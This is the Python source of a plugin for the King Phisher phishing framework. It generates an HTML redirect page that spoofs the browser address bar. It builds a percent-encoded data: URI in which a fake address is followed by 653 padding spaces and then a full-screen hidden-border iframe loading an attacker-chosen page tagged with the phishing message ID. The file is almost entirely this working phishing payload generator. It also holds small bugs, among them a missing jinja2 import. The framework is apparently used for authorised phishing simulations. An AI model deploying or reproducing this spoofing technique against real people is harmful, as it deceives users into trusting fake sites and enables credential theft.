import posixpath
import os

import king_phisher.client.gui_utilities as gui_utilities
import king_phisher.client.mailer as mailer
import king_phisher.client.plugins as plugins

def _expand_path(output_file, *joins, pathmod=os.path):
	output_file = pathmod.expandvars(output_file)
	output_file = pathmod.expanduser(output_file)
	output_file.join(output_file, *joins)
	return output_file

class Plugin(plugins.ClientPlugin):
	authors = ['Jeremy Schoeneman']
	title = 'URI Spoof Generator'
	description = """
	Exports a redirect page which allows URI spoofing in the address bar of the
	target's browser
	"""
	homepage = 'https://github.com/securestate/king-phisher-plugins'
	options = [
		plugins.ClientOptionString(
			'redir_url',
			'URL to redirect to',
			display_name='Redirect URL'
		),
		plugins.ClientOptionString(
			'spoofed_uri',
			'URI to spoof from',
			display_name='Spoofed URI'
		),
		plugins.ClientOptionString(
			'output_html_file',
			'HTML file to output to',
			display_name='Output HTML File',
			default='~/redir.html'
		)
	]
	version = '1.1'
	def initialize(self):
		self.add_menu_item('Tools > Create Data URI Phish', self.make_page)
		return True

	def make_page(self, _):
		if self.config['redir_url'] is None:
			gui_utilities.show_dialog_error(
				'Missing Option',
				self.application.get_active_window(),
				'Please configure the "Redirect URL" option.'
			)
			return
		if self.config['spoofed_uri'] is None:
			gui_utilities.show_dialog_error(
				'Missing Option',
				self.application.get_active_window(),
				'Please configure the "Spoofed URI" option.'
			)
			return

		outfile = self.expand_path(self.config['output_html_file'])
		try:
			with open (outfile, 'w') as file_h:
				file_h.write(self.build_html())
				self.logger.info('html file exported successfully')
			file_h.close()
		except IOError as e:
			self.logger.error('outputting file error', e)
		return

	def build_html(self):
		page = '<html>'
		page += '  <script>'
		page += '    window.location.href = decodeURIComponent("'+ self.escape_url(self.config['redir_url'], self.config['spoofed_uri']) + '")'
		page += '  </script>'
		page += '</html>'
		return page

	def escape_url(self, url, spoofed_url):
		full_url = 'data:text/html,' + spoofed_url
		full_url += ' ' * 653
		full_url += '<iframe width=\"100%\" height=\"100%\" src=\"' + url + '?id={{ client.message_id }}\"></iframe>'
		full_url += '<style>body{color:#fff; overflow:hidden;margin:-10px 0px 0px 0px; background-color: #fff;} iframe { border:none; outline:none;}</style>")'

		return '%' + '%'.join([ "%x" % ord(x) for x in full_url]).strip()

	def expand_path(self, output_file, *args, **kwargs):
		expanded_path = _expand_path(output_file, *args, **kwargs)
		try:
			expanded_path = mailer.render_message_template(expanded_path, self.application.config)
		except jinja2.exceptions.TemplateSyntaxError as error:
			self.logger.error("jinja2 syntax error ({0}) in directory: {1}".format(error.message, output_file))
			gui_utilities.show_dialog_error('Error', self.application.get_active_window(), 'Error creating the HTML file.')
			return None
		except ValueError as error:
			self.logger.error("value error ({0}) in directory: {1}".format(error, output_file))
			gui_utilities.show_dialog_error('Error', self.application.get_active_window(), 'Error creating the HTML file.')
			return None
		return expanded_path

